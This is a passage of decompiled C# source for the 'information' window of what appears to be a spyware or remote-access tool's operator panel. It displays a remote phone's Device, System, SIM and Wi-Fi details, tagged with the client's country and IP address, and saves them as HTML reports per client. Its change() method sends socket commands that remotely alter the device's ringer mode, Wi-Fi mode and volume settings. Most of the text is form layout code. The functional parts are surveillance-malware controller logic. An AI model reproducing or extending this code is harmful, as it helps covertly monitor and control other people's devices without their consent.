		this.DGV3.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV3.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV3.EnableHeadersVisualStyles = false;
		this.DGV3.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV3.Location = new System.Drawing.Point(0, 687);
		this.DGV3.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV3.Name = "DGV3";
		this.DGV3.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV3.RowHeadersVisible = false;
		this.DGV3.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV3.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV3.Size = new System.Drawing.Size(492, 110);
		this.DGV3.TabIndex = 10;
		this.DataGridViewTextBoxColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn3.FillWeight = 50f;
		this.DataGridViewTextBoxColumn3.HeaderText = "Property";
		this.DataGridViewTextBoxColumn3.Name = "DataGridViewTextBoxColumn3";
		this.DataGridViewTextBoxColumn3.ReadOnly = true;
		this.DataGridViewTextBoxColumn3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column4.FillWeight = 50f;
		this.Column4.HeaderText = "value";
		this.Column4.Name = "Column4";
		this.Column4.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB4.BackColor = System.Drawing.Color.Black;
		this.LB4.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB4.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB4.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB4.Location = new System.Drawing.Point(0, 657);
		this.LB4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB4.Name = "LB4";
		this.LB4.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB4.Size = new System.Drawing.Size(492, 30);
		this.LB4.TabIndex = 9;
		this.LB4.Text = "Wi-Fi";
		this.LB4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV2.AllowUserToAddRows = false;
		this.DGV2.AllowUserToDeleteRows = false;
		this.DGV2.AllowUserToResizeColumns = false;
		this.DGV2.AllowUserToResizeRows = false;
		this.DGV2.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV2.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV2.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.DGV2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV2.ColumnHeadersVisible = false;
		this.DGV2.Columns.AddRange(this.DataGridViewTextBoxColumn2, this.Column5);
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle10.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV2.DefaultCellStyle = dataGridViewCellStyle10;
		this.DGV2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV2.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV2.EnableHeadersVisualStyles = false;
		this.DGV2.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV2.Location = new System.Drawing.Point(0, 495);
		this.DGV2.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV2.Name = "DGV2";
		this.DGV2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV2.RowHeadersVisible = false;
		this.DGV2.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV2.Size = new System.Drawing.Size(492, 162);
		this.DGV2.TabIndex = 8;
		this.DataGridViewTextBoxColumn2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn2.FillWeight = 50f;
		this.DataGridViewTextBoxColumn2.HeaderText = "Property";
		this.DataGridViewTextBoxColumn2.Name = "DataGridViewTextBoxColumn2";
		this.DataGridViewTextBoxColumn2.ReadOnly = true;
		this.DataGridViewTextBoxColumn2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column5.FillWeight = 50f;
		this.Column5.HeaderText = "value";
		this.Column5.Name = "Column5";
		this.Column5.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB3.BackColor = System.Drawing.Color.Black;
		this.LB3.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB3.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB3.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB3.Location = new System.Drawing.Point(0, 465);
		this.LB3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB3.Name = "LB3";
		this.LB3.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB3.Size = new System.Drawing.Size(492, 30);
		this.LB3.TabIndex = 7;
		this.LB3.Text = "SIM";
		this.LB3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV1.AllowUserToAddRows = false;
		this.DGV1.AllowUserToDeleteRows = false;
		this.DGV1.AllowUserToResizeColumns = false;
		this.DGV1.AllowUserToResizeRows = false;
		this.DGV1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV1.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV1.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV1.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle11.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle11.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle11.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle11.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle11.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle11;
		this.DGV1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV1.ColumnHeadersVisible = false;
		this.DGV1.Columns.AddRange(this.DataGridViewTextBoxColumn1, this.Column6);
		dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle12.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle12.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle12.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV1.DefaultCellStyle = dataGridViewCellStyle12;
		this.DGV1.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV1.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV1.EnableHeadersVisualStyles = false;
		this.DGV1.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV1.Location = new System.Drawing.Point(0, 359);
		this.DGV1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV1.Name = "DGV1";
		this.DGV1.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV1.RowHeadersVisible = false;
		this.DGV1.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV1.Size = new System.Drawing.Size(492, 106);
		this.DGV1.TabIndex = 6;
		this.DataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.DataGridViewTextBoxColumn1.FillWeight = 50f;
		this.DataGridViewTextBoxColumn1.HeaderText = "Property";
		this.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1";
		this.DataGridViewTextBoxColumn1.ReadOnly = true;
		this.DataGridViewTextBoxColumn1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column6.FillWeight = 50f;
		this.Column6.HeaderText = "value";
		this.Column6.Name = "Column6";
		this.Column6.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB2.BackColor = System.Drawing.Color.Black;
		this.LB2.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB2.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB2.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB2.Location = new System.Drawing.Point(0, 329);
		this.LB2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB2.Name = "LB2";
		this.LB2.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB2.Size = new System.Drawing.Size(492, 30);
		this.LB2.TabIndex = 5;
		this.LB2.Text = "System";
		this.LB2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle13.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle13.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle13.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle13.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle13.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle13.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle13.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle13;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV0.ColumnHeadersVisible = false;
		this.DGV0.Columns.AddRange(this.Column1, this.Column2);
		dataGridViewCellStyle14.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle14.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle14.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle14.ForeColor = System.Drawing.Color.FromArgb(190, 190, 190);
		dataGridViewCellStyle14.SelectionBackColor = System.Drawing.Color.FromArgb(51, 153, 255);
		dataGridViewCellStyle14.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle14.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle14;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Top;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV0.Location = new System.Drawing.Point(0, 30);
		this.DGV0.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.ScrollBars = System.Windows.Forms.ScrollBars.None;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(492, 299);
		this.DGV0.TabIndex = 4;
		this.DGV0.Tag = "";
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.FillWeight = 50f;
		this.Column1.HeaderText = "Property";
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column2.FillWeight = 50f;
		this.Column2.HeaderText = "value";
		this.Column2.Name = "Column2";
		this.Column2.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.LB1.BackColor = System.Drawing.Color.Black;
		this.LB1.Dock = System.Windows.Forms.DockStyle.Top;
		this.LB1.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.LB1.ForeColor = System.Drawing.Color.FromArgb(254, 0, 0);
		this.LB1.Location = new System.Drawing.Point(0, 0);
		this.LB1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.LB1.Name = "LB1";
		this.LB1.Padding = new System.Windows.Forms.Padding(0, 0, 0, 5);
		this.LB1.Size = new System.Drawing.Size(492, 30);
		this.LB1.TabIndex = 0;
		this.LB1.Text = "Device";
		this.LB1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.TOpacity.Interval = 1;
		this.ctxMenu.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem });
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.ShowImageMargin = false;
		this.ctxMenu.Size = new System.Drawing.Size(105, 52);
		this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
		this.SaveToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
		this.SaveToolStripMenuItem.Text = "Save";
		this.SaveToolStripMenuItem.Visible = false;
		this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
		this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(104, 24);
		this.SaveAsToolStripMenuItem.Text = "Save As";
		this.SaveAsToolStripMenuItem.Visible = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(513, 663);
		base.Controls.Add(this.Panel1);
		base.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		base.Name = "information";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "info";
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV6).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV5).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV4).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV3).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctxMenu.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public information()
	{
		base.Load += info_Load;
		Title = "null";
		tmpTable = null;
		DS = null;
		InitializeComponent();
		Font = reso.f;
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				LB1.Text = Codes.Translate(LB1.Text, "en", "zh");
				LB2.Text = Codes.Translate(LB2.Text, "en", "zh");
				LB3.Text = Codes.Translate(LB3.Text, "en", "zh");
				LB4.Text = Codes.Translate(LB4.Text, "en", "zh");
				LB5.Text = Codes.Translate(LB5.Text, "en", "zh");
				LB7.Text = Codes.Translate(LB7.Text, "en", "zh");
				LB6.Text = Codes.Translate(LB6.Text, "en", "zh");
			}
		}
		else
		{
			LB1.Text = Codes.Translate(LB1.Text, "en", "ar");
			LB2.Text = Codes.Translate(LB2.Text, "en", "ar");
			LB3.Text = Codes.Translate(LB3.Text, "en", "ar");
			LB4.Text = Codes.Translate(LB4.Text, "en", "ar");
			LB5.Text = Codes.Translate(LB5.Text, "en", "ar");
			LB6.Text = Codes.Translate(LB6.Text, "en", "ar");
			LB7.Text = Codes.Translate(LB7.Text, "en", "ar");
		}
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	public void grreSize()
	{
		checked
		{
			foreach (DataGridView item in Panel1.Controls.OfType<DataGridView>())
			{
				int num = item.Rows.Count * item.Rows[0].Height;
				item.Height = num + 5;
			}
		}
	}

	private void info_Load(object sender, EventArgs e)
	{
		SaveToolStripMenuItem.Visible = true;
		SaveAsToolStripMenuItem.Visible = true;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\11.ico");
		translateme();
		grreSize();
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void ClearSEL(DataGridView DG0)
	{
		foreach (DataGridView item in Panel1.Controls.OfType<DataGridView>())
		{
			if (Operators.CompareString(item.Name, DG0.Name, TextCompare: false) != 0 && item.Rows.Count > 0)
			{
				item.CurrentCell = item.Rows[0].Cells[0];
				item.ClearSelection();
			}
		}
	}

	private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV0);
	}

	private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV1);
	}

	private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV2);
	}

	private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV3);
	}

	private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV4);
	}

	private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV5);
	}

	private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
	{
		ClearSEL(DGV6);
	}

	private void DGV5_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
	{
		EventName = "DGV5";
		EventArgs = e;
	}

	private void DGV6_CellBeginEdit(object sender, DataGridViewCellCancelEventArgs e)
	{
		EventName = "DGV6";
		EventArgs = e;
	}

	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (tmpTable != null)
		{
			reso.Directory_Exist(classClient);
			if (DS == null)
			{
				DS = new DataSet("info");
				DS.Tables.Add(tmpTable);
			}
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DS,
				tmpFolderUSER,
				"informations",
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"informations",
				"info",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}
	}

	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (DS == null)
			{
				DS = new DataSet("info");
				DS.Tables.Add(tmpTable);
			}
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DS,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"informations",
				"info",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	private void ComboBox_SelectedIndexChanged(object sender, EventArgs e)
	{
		ComboBox comboBox = (ComboBox)sender;
		if (comboBox == null || comboBox.Text.Length <= 0 || EventArgs == null || !((EventArgs.ColumnIndex != -1) & (EventArgs.RowIndex != -1) & (Operators.CompareString(EventName, null, TextCompare: false) != 0)))
			return;
		string eventName = EventName;
		if (Operators.CompareString(eventName, "DGV5", TextCompare: false) != 0)
		{
			if (Operators.CompareString(eventName, "DGV6", TextCompare: false) == 0)
			{
				if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 0))
					change("ringer_mode", Conversions.ToString(comboBox.SelectedIndex));
				else if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 1))
				{
					change("wifi_mode", Conversions.ToString(comboBox.SelectedIndex));
				}
			}
		}
		else if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 0))
		{
			change("ring", Conversions.ToString(comboBox.SelectedIndex));
		}
		else if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 1))
		{
			change("music", Conversions.ToString(comboBox.SelectedIndex));
		}
		else if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 2))
		{
			change("notification", Conversions.ToString(comboBox.SelectedIndex));
		}
		else if ((EventArgs.ColumnIndex == 1) & (EventArgs.RowIndex == 3))
		{
			change("system", Conversions.ToString(comboBox.SelectedIndex));
		}
	}

	private void change(string num, string vul)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + num + Data.SPL_DATA + vul,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DGV5_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
	{
		ComboBox comboBox = (ComboBox)e.Control;
		if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
		{
			if (!Information.IsNothing(LastComboDGV5))
				LastComboDGV5.SelectionChangeCommitted -= ComboBox_SelectedIndexChanged;
			LastComboDGV5 = comboBox;
			LastComboDGV5.SelectionChangeCommitted += ComboBox_SelectedIndexChanged;
		}
	}

	private void DGV6_EditingControlShowing(object sender, DataGridViewEditingControlShowingEventArgs e)
	{
		ComboBox comboBox = (ComboBox)e.Control;
		if (!Information.IsNothing(RuntimeHelpers.GetObjectValue(comboBox.SelectedItem)))
		{
			if (!Information.IsNothing(LastComboDGV6))
				LastComboDGV6.SelectionChangeCommitted -= ComboBox_SelectedIndexChanged;
			LastComboDGV6 = comboBox;
			LastComboDGV6.SelectionChangeCommitted += ComboBox_SelectedIndexChanged;
		}
	}
}
